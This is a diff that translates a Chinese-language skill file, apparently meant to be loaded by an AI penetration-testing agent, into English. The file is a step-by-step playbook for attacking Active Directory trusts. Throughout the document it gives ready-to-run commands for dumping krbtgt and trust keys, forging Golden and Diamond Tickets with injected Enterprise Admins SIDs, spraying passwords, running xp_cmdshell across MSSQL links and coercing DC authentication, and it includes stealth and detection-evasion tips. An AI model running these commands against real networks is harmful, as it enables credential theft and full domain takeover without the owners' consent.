@@ -1,31 +1,34 @@
 ---
 name: ad-trust-attack
-description: "域信任关系攻击。当目标存在多域/多林环境时使用。包含父子域提权（Golden Ticket + ExtraSid）、跨林攻击（SID History/MSSQL Trust Links）、单向信任利用。已获取子域 Domain Admin 或发现信任关系时优先加载。"
+description: "Domain trust relationship attacks. Use when the target has a multi-domain or multi-forest environment. Covers parent-child domain privilege escalation (Golden Ticket + ExtraSid), cross-forest attacks (SID History/MSSQL Trust Links), and one-way trust abuse. Load this first when child-domain Domain Admin access is obtained or a trust relationship is discovered."
+zh-signals: "枚举并利用 Active Directory 域信任关系实现跨域/跨林提权与横向移动。信号:域信任,父子域提权,ExtraSid,跨林攻击,Golden Ticket。"
+when-to-use: >-
+  Use when a target environment has multiple domains or forests, when you already hold child-domain Domain Admin or krbtgt material, or when trust relationships must be enumerated and exploited for cross-domain privilege escalation.
 metadata:
   tags: "domain-trust,forest-trust,child-parent,extrasid,sid-filtering,golden-ticket,diamond-ticket,raiseChild,cross-forest,trust-enumeration,kerberos"
   category: "lateral"
 ---
 
-# 域信任关系攻击
+# Domain Trust Relationship Attacks
 
-枚举和利用 Active Directory 信任关系，实现跨域和跨林的横向移动与权限提升。
+Enumerate and exploit Active Directory trust relationships to achieve lateral movement and privilege escalation across domains and forests.
 
-## 触发条件
+## Trigger Conditions
 
-- 已获得子域 Domain Admin 或 krbtgt 哈希，需提升至父域
-- 枚举发现域间/林间信任关系
-- 目标环境存在多域或多林架构
-- 需要跨信任边界横向移动
+- Child-domain Domain Admin or krbtgt hash obtained, and elevation to the parent domain is required
+- Domain or forest trust relationships discovered during enumeration
+- The target environment has a multi-domain or multi-forest architecture
+- Lateral movement across trust boundaries is required
 
-## 前置要求
+## Prerequisites
 
-- 当前域的高权限凭据 (Domain Admin / krbtgt hash / 信任密钥)
-- 已完成信任关系枚举或已知信任拓扑
-- 工具: ticketer.py, raiseChild.py, secretsdump.py, lookupsid.py, Rubeus, ldeep, NetExec
+- High-privilege credentials in the current domain (Domain Admin / krbtgt hash / trust key)
+- Trust relationship enumeration completed or the trust topology is already known
+- Tools: ticketer.py, raiseChild.py, secretsdump.py, lookupsid.py, Rubeus, ldeep, NetExec
 
 ---
 
-## Phase 1: 信任关系枚举
+## Phase 1: Trust Relationship Enumeration
 
 ```bash
 ldeep ldap -u <USER> -p <PASSWORD> -d <DOMAIN> -s ldap://<DC> trusts
@@ -35,66 +38,66 @@ bloodhound-python -u <USER> -p <PASSWORD> -d <DOMAIN> -c Trusts
 
 ```powershell
 Get-DomainTrust                              # PowerView
-Get-ForestTrust                              # 森林信任
-nltest /domain_trusts /all_trusts            # Windows 原生
+Get-ForestTrust                              # Forest trust
+nltest /domain_trusts /all_trusts            # Native Windows
 ```
 
-### 输出解读
+### Interpreting the Output
 
-| 字段 | 含义 |
+| Field | Meaning |
 |------|------|
-| TrustDirection: Bidirectional | 双向信任，可双向访问 |
-| TrustDirection: Inbound | 对方信任我们，我们可访问对方 |
-| TrustDirection: Outbound | 我们信任对方，对方可访问我们 |
-| TrustAttributes: WITHIN_FOREST | 森林内，无 SID 过滤 |
-| TrustAttributes: FOREST_TRANSITIVE | 森林信任，有 SID 过滤 |
+| TrustDirection: Bidirectional | Two-way trust, accessible in both directions |
+| TrustDirection: Inbound | The other side trusts us, we can access the other side |
+| TrustDirection: Outbound | We trust the other side, the other side can access us |
+| TrustAttributes: WITHIN_FOREST | Within the forest, no SID filtering |
+| TrustAttributes: FOREST_TRANSITIVE | Forest trust, SID filtering applies |
 
 ---
 
-## Phase 2: 信任类型与攻击面分析
+## Phase 2: Trust Type and Attack Surface Analysis
 
-### 信任类型速查
+### Trust Type Quick Reference
 
-| 信任类型 | 方向 | SID 过滤 | 主要攻击方式 |
+| Trust type | Direction | SID filtering | Main attack method |
 |----------|------|----------|-------------|
-| **父子域 (Parent-Child)** | 双向 | 禁用 | Golden Ticket + ExtraSid |
-| **树根 (Tree-Root)** | 双向 | 禁用 | Golden Ticket + ExtraSid |
-| **外部 (External)** | 单向 | 启用 | 外部组成员 / 密码重用 |
-| **森林 (Forest)** | 双向 | 启用 | SID History(受限) / MSSQL Links |
+| **Parent-Child** | Bidirectional | Disabled | Golden Ticket + ExtraSid |
+| **Tree-Root** | Bidirectional | Disabled | Golden Ticket + ExtraSid |
+| **External** | One-way | Enabled | External group members / password reuse |
+| **Forest** | Bidirectional | Enabled | SID History (restricted) / MSSQL Links |
 
-### 关键信任属性
+### Key Trust Attributes
 
-| 属性 | 值 | 安全含义 |
+| Attribute | Value | Security meaning |
 |------|-----|---------|
-| WITHIN_FOREST | 0x20 | 森林内，无 SID 过滤 |
-| FOREST_TRANSITIVE | 0x08 | 森林信任，有 SID 过滤 |
-| TREAT_AS_EXTERNAL | 0x40 | 视为外部，启用 SID 过滤 |
-| QUARANTINED_DOMAIN | 0x04 | 域隔离，强制 SID 过滤 |
+| WITHIN_FOREST | 0x20 | Within the forest, no SID filtering |
+| FOREST_TRANSITIVE | 0x08 | Forest trust, SID filtering applies |
+| TREAT_AS_EXTERNAL | 0x40 | Treated as external, SID filtering enabled |
+| QUARANTINED_DOMAIN | 0x04 | Domain quarantine, SID filtering enforced |
 
-### SID 过滤影响
+### SID Filtering Impact
 
-| 信任类型 | ExtraSid 攻击 | 备注 |
+| Trust type | ExtraSid attack | Notes |
 |----------|--------------|------|
-| 森林内 (WITHIN_FOREST) | 完全可用 | Enterprise Admins (-519) 有效 |
-| 外部/森林信任 | 仅 RID > 1000 | 知名 SID 被过滤 |
-| 隔离域 (Quarantined) | 极度受限 | 几乎全部被过滤 |
+| Within forest (WITHIN_FOREST) | Fully usable | Enterprise Admins (-519) valid |
+| External / forest trust | RID > 1000 only | Well-known SIDs are filtered |
+| Quarantined domain | Extremely restricted | Almost everything is filtered |
 
 ---
 
-## Phase 3: 子域到父域提权
+## Phase 3: Child-to-Parent Domain Privilege Escalation
 
-**核心原理**: 同一森林内无 SID 过滤，子域 krbtgt 签发的票据中可注入父域 Enterprise Admins SID (-519)。
+**Core principle**: there is no SID filtering within the same forest, so the parent-domain Enterprise Admins SID (-519) can be injected into tickets issued by the child-domain krbtgt.
 
-### 3.1 获取必要信息
+### 3.1 Gather the Required Information
 
 ```bash
-# 获取子域 SID
+# Get the child domain SID
 lookupsid.py <CHILD_DOMAIN>/<USER>:<PASSWORD>@<CHILD_DC> 0
 
-# 获取父域 SID (Enterprise Admins = 父域SID + "-519")
+# Get the parent domain SID (Enterprise Admins = parent SID + "-519")
 lookupsid.py <CHILD_DOMAIN>/<USER>:<PASSWORD>@<PARENT_DC> 0
 
-# 转储子域 krbtgt 哈希
+# Dump the child-domain krbtgt hash
 secretsdump.py -just-dc-user '<CHILD_DOMAIN>/krbtgt' \
   '<CHILD_DOMAIN>/<USER>:<PASSWORD>@<CHILD_DC>'
 ```
@@ -113,21 +116,21 @@ secretsdump.py -k -no-pass <PARENT_DOMAIN>/fakeadmin@<PARENT_DC>
 ```
 
 ```powershell
-# Rubeus (AES256 更隐蔽)
+# Rubeus (AES256 is stealthier)
 Rubeus.exe golden /aes256:<KRBTGT_AES256> /user:Administrator \
   /domain:<CHILD_DOMAIN> /sid:<CHILD_SID> /sids:<PARENT_SID>-519 /nowrap
 ```
 
-### 3.3 Diamond Ticket 变体
+### 3.3 Diamond Ticket Variant
 
-修改合法 TGT 的 PAC 而非从零伪造，绕过部分检测:
+Modify the PAC of a legitimate TGT instead of forging one from scratch, bypassing some detections:
 
 ```powershell
 Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 \
   /groups:519 /sids:<PARENT_SID>-519 /krbkey:<KRBTGT_AES256> /nowrap
 ```
 
-### 3.4 raiseChild.py 自动化
+### 3.4 raiseChild.py Automation
 
 ```bash
 raiseChild.py -target-exec <PARENT_DC> '<CHILD_DOMAIN>/Administrator:<PASSWORD>'
@@ -137,10 +140,10 @@ raiseChild.py -target-exec <PARENT_DC> -hashes :<NTHASH> '<CHILD_DOMAIN>/Adminis
 ### 3.5 Trust Ticket (Inter-Realm TGT)
 
 ```bash
-# 转储信任密钥
+# Dump the trust key
 secretsdump.py '<CHILD_DOMAIN>/Administrator:<PASSWORD>@<CHILD_DC>' | grep -i trust
 
-# 伪造跨域 TGT
+# Forge a cross-domain TGT
 ticketer.py -nthash <TRUST_KEY_HASH> \
   -domain-sid '<CHILD_SID>' \
   -domain <CHILD_DOMAIN> \
@@ -151,24 +154,24 @@ export KRB5CCNAME=fakeuser.ccache
 getST.py -k -no-pass -spn cifs/<PARENT_DC>.<PARENT_DOMAIN> <PARENT_DOMAIN>/fakeuser
 ```
 
-> 详细步骤与方法对比 -> [references/child-parent-escalation.md](references/child-parent-escalation.md)
+> Detailed steps and method comparison -> [references/child-parent-escalation.md](references/child-parent-escalation.md)
 
 ---
 
-## Phase 4: 单向信任利用
+## Phase 4: One-Way Trust Abuse
 
-### 4.1 入站信任 (Inbound)
+### 4.1 Inbound Trust
 
-外部域信任我们，我们的用户可以访问外部域资源。
+The external domain trusts us, so our users can access resources in the external domain.
 
 ```powershell
-# 查找外部域中的本域用户/组
+# Find our domain users/groups in the external domain
 Get-DomainForeignGroupMember -Domain <EXTERNAL_DOMAIN>
 ConvertFrom-SID S-1-5-21-<MEMBER_SID>
 ```
 
 ```powershell
-# 跨域票据请求
+# Cross-domain ticket requests
 Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /aes256:<AES256> /nowrap
 Rubeus.exe asktgs /service:krbtgt/<EXTERNAL_DOMAIN> /domain:<DOMAIN> \
   /dc:<DC> /ticket:<TGT_BASE64> /nowrap
@@ -176,34 +179,34 @@ Rubeus.exe asktgs /service:cifs/<EXTERNAL_DC> /domain:<EXTERNAL_DOMAIN> \
   /dc:<EXTERNAL_DC> /ticket:<REFERRAL_TICKET> /nowrap
 ```
 
-### 4.2 出站信任 (Outbound)
+### 4.2 Outbound Trust
 
-我们信任外部域，可获取信任密钥进行进一步利用。
+We trust the external domain, so the trust key can be obtained for further exploitation.
 
 ```powershell
-# 转储信任密钥
+# Dump the trust key
 mimikatz lsadump::trust /patch
 ```
 
 ```bash
-# DCSync 信任账户
+# DCSync the trust account
 secretsdump.py -just-dc-user '<EXTERNAL_DOMAIN>$' \
   '<DOMAIN>/Administrator:<PASSWORD>@<DC>'
 
-# 使用信任账户身份进行 Kerberoast 等攻击
+# Use the trust account identity for attacks such as Kerberoast
 Rubeus.exe asktgt /user:<DOMAIN>$ /domain:<EXTERNAL_DOMAIN> /rc4:<TRUST_KEY> /nowrap
 ```
 
 ---
 
-## Phase 5: 跨林攻击
+## Phase 5: Cross-Forest Attacks
 
-**场景**: 森林信任存在 SID 过滤，需要替代攻击路径。
+**Scenario**: a forest trust exists with SID filtering, so alternative attack paths are needed.
 
-### 5.1 SID History (受限)
+### 5.1 SID History (Restricted)
 
 ```bash
-# 在目标林找 RID > 1000 有价值组，创建 Golden Ticket 注入其 SID
+# Find a valuable group with RID > 1000 in the target forest, create a Golden Ticket injecting its SID
 ticketer.py -nthash <KRBTGT_HASH> \
   -domain-sid '<SOURCE_SID>' \
   -domain <SOURCE_DOMAIN> \
@@ -214,14 +217,14 @@ export KRB5CCNAME=fakeuser.ccache
 smbclient.py -k -no-pass <TARGET_DOMAIN>/fakeuser@<TARGET_DC>
 ```
 
-### 5.2 外部组成员
+### 5.2 External Group Members
 
 ```powershell
 Get-DomainForeignGroupMember -Domain <TARGET_FOREST>
 Get-DomainForeignUser -Domain <TARGET_FOREST>
 ```
 
-### 5.3 密码重用
+### 5.3 Password Reuse
 
 ```bash
 netexec smb <TARGET_DC> -u '<USER>' -p '<PASSWORD>' -d '<TARGET_FOREST>'
@@ -231,122 +234,122 @@ netexec smb <TARGET_DC> -u users.txt -p passwords.txt -d '<TARGET_FOREST>'
 ### 5.4 MSSQL Linked Server
 
 ```sql
--- 枚举链接服务器
+-- Enumerate linked servers
 SELECT * FROM master..sysservers;
 
--- 在链接服务器上执行
+-- Execute on the linked server
 EXEC ('SELECT SYSTEM_USER') AT [LINKED_SERVER];
 
--- 链式穿越
+-- Chain traversal
 EXEC ('EXEC (''SELECT SYSTEM_USER'') AT [SECOND_LINK]') AT [FIRST_LINK];
 
--- 通过链接执行命令 (需 xp_cmdshell)
+-- Execute commands through the link (requires xp_cmdshell)
 EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER];
 ```
 
-### 5.5 非约束委派跨域
+### 5.5 Unconstrained Delegation Across Domains
 
 ```bash
-# 查找非约束委派 → 强制目标林 DC 认证 → 捕获 TGT
+# Find unconstrained delegation -> coerce the target forest DC to authenticate -> capture the TGT
 Get-DomainComputer -Unconstrained -Domain <SOURCE_DOMAIN>
 Rubeus.exe monitor /interval:5 /nowrap /filteruser:<TARGET_DC>$
-# 触发: PrinterBug / PetitPotam / DFSCoerce
+# Trigger: PrinterBug / PetitPotam / DFSCoerce
 Rubeus.exe ptt /ticket:<CAPTURED_TGT>
 ```
 
-### 5.6 跨信任 ACL 滥用
+### 5.6 Cross-Trust ACL Abuse
 
 ```powershell
 Get-DomainObjectAcl -Domain <TARGET_FOREST> |
   Where-Object {$_.SecurityIdentifier -match 'S-1-5-21-<SOURCE_SID>'}
 ```
 
-> 详细攻击手法与实战案例 -> [references/cross-forest-attack.md](references/cross-forest-attack.md)
+> Detailed attack techniques and real-world cases -> [references/cross-forest-attack.md](references/cross-forest-attack.md)
 
 ---
 
-## 决策树
+## Decision Tree
 
 ```
-[开始] 发现域信任关系 / 已获取子域 DA
+[Start] Domain trust discovered / child-domain DA obtained
     │
-    ├─ 枚举: ldeep / NetExec / PowerView / BloodHound / nltest
+    ├─ Enumerate: ldeep / NetExec / PowerView / BloodHound / nltest
     │
     ▼
-[分析] 信任类型?
+[Analyze] Trust type?
     │
-    ├─ WITHIN_FOREST (父子域/树根) ───────────────────────┐
-    │   └─ 无 SID 过滤                                     │
-    │       ├─ 有 krbtgt ── Golden Ticket + ExtraSid(-519) ┤
-    │       ├─ 需隐蔽 ──── Diamond Ticket ─────────────────┤
-    │       ├─ 要快速 ──── raiseChild.py ──────────────────┤
-    │       └─ 有信任密钥 ─ Trust Ticket ──────────────────┤
-    │                                                       ▼
-    │                                              获取父域 DA → DCSync
+    ├─ WITHIN_FOREST (parent-child/tree-root) ───────────────────────┐
+    │   └─ No SID filtering                                          │
+    │       ├─ Have krbtgt ── Golden Ticket + ExtraSid(-519)         ┤
+    │       ├─ Need stealth ── Diamond Ticket                        ┤
+    │       ├─ Want speed ── raiseChild.py                           ┤
+    │       └─ Have trust key ── Trust Ticket                        ┤
+    │                                                                 ▼
+    │                                       Obtain parent DA -> DCSync
     │
-    ├─ FOREST_TRANSITIVE (森林信任) ──────────────────────┐
-    │   └─ 有 SID 过滤 (RID > 1000 可通过)                │
-    │       ├─ RID>1000 组 ── SID History ────────────────┤
-    │       ├─ 外部组成员 ── 已授权跨林访问 ──────────────┤
-    │       ├─ 密码重用 ──── netexec 喷洒 ────────────────┤
-    │       ├─ MSSQL 链接 ── xp_cmdshell ────────────────┤
-    │       └─ 非约束委派 ── 跨林 TGT 捕获 ──────────────┤
-    │                                                      ▼
-    │                                              跨林访问
+    ├─ FOREST_TRANSITIVE (forest trust) ─────────────────────────────┐
+    │   └─ SID filtering applies (RID > 1000 passes)                 │
+    │       ├─ RID>1000 group ── SID History                         ┤
+    │       ├─ Foreign group member ── authorized cross-forest       ┤
+    │       ├─ Password reuse ── netexec spray                       ┤
+    │       ├─ MSSQL link ── xp_cmdshell                             ┤
+    │       └─ Unconstrained delegation ── cross-forest TGT          ┤
+    │                                                                 ▼
+    │                                              Cross-forest access
     │
-    ├─ Inbound (对方信任我们) ────────────────────────────┐
-    │   ├─ 查找外部组成员 ── ForeignGroupMember ──────────┤
-    │   └─ 跨域票据请求 ──── Rubeus asktgt/asktgs ───────┤
-    │                                                      ▼
-    │                                              访问外部域
+    ├─ Inbound (the other side trusts us) ───────────────────────────┐
+    │   ├─ Find foreign group members ── ForeignGroupMember          ┤
+    │   └─ Cross-domain ticket request ── Rubeus asktgt/asktgs       ┤
+    │                                                                 ▼
+    │                                       Access the external domain
     │
-    └─ Outbound (我们信任对方) ──────────────────────────┐
-        ├─ 转储信任密钥 ──── lsadump::trust / DCSync ────┤
-        └─ 信任账户登录 ──── Kerberoast 目标域 ──────────┤
-                                                           ▼
-                                                   目标域立足点
+    └─ Outbound (we trust the other side) ───────────────────────────┐
+        ├─ Dump trust key ── lsadump::trust / DCSync                 ┤
+        └─ Trust account login ── Kerberoast the target domain       ┤
+    │                                                                 ▼
+    │                                    Foothold in the target domain
 ```
 
 ---
 
-## 验证清单
+## Verification Checklist
 
-- [ ] 枚举所有信任关系 (类型、方向、属性)
-- [ ] 确定 SID 过滤状态 (WITHIN_FOREST vs FOREST_TRANSITIVE)
-- [ ] 获取所需凭据 (krbtgt hash / 信任密钥 / DA 密码)
-- [ ] 根据信任类型选择攻击方法
-- [ ] 执行跨域/跨林攻击并验证访问
-- [ ] DCSync 目标域获取完整凭据
-
----
-
-## 常见问题
-
-### ExtraSid 攻击失败
-
-1. 确认是森林内信任 (WITHIN_FOREST=0x20)，外部/森林信任会过滤 -519
-2. 检查 krbtgt hash 是否正确，域 SID 是否匹配
-
-### raiseChild.py 失败
-
-1. 确认有子域 DA 权限且可 DCSync
-2. 检查到父域 DC 的网络连通性
-3. 手动分步: lookupsid -> secretsdump -> ticketer
-
-### 跨林 SID History 不生效
-
-1. 确认目标组 RID > 1000 (知名 SID 被过滤)
-2. 检查信任上是否启用 SID History (默认禁用)
+- [ ] Enumerate all trust relationships (type, direction, attributes)
+- [ ] Determine the SID filtering state (WITHIN_FOREST vs FOREST_TRANSITIVE)
+- [ ] Obtain the required credentials (krbtgt hash / trust key / DA password)
+- [ ] Select the attack method based on the trust type
+- [ ] Execute the cross-domain / cross-forest attack and verify access
+- [ ] DCSync the target domain to obtain full credentials
 
 ---
 
-## 工具参考
+## FAQ
 
-| 工具 | 用途 |
+### ExtraSid Attack Fails
+
+1. Confirm it is a within-forest trust (WITHIN_FOREST=0x20); external and forest trusts filter -519
+2. Check that the krbtgt hash is correct and the domain SID matches
+
+### raiseChild.py Fails
+
+1. Confirm you have child-domain DA rights and can DCSync
+2. Check network connectivity to the parent-domain DC
+3. Run the steps manually: lookupsid -> secretsdump -> ticketer
+
+### Cross-Forest SID History Does Not Work
+
+1. Confirm the target group RID > 1000 (well-known SIDs are filtered)
+2. Check whether SID History is enabled on the trust (disabled by default)
+
+---
+
+## Tool Reference
+
+| Tool | Purpose |
 |------|------|
-| ldeep / NetExec / BloodHound | 信任枚举与可视化 |
-| lookupsid.py | 域 SID 查询 |
-| secretsdump.py | krbtgt / 信任密钥转储 |
+| ldeep / NetExec / BloodHound | Trust enumeration and visualization |
+| lookupsid.py | Domain SID lookup |
+| secretsdump.py | krbtgt / trust key dumping |
 | ticketer.py | Golden Ticket / Trust Ticket |
-| raiseChild.py | 自动化子域到父域提权 |
-| Rubeus / mimikatz | Windows 票据操作与密钥转储 |
+| raiseChild.py | Automated child-to-parent domain privilege escalation |
+| Rubeus / mimikatz | Windows ticket operations and key dumping |
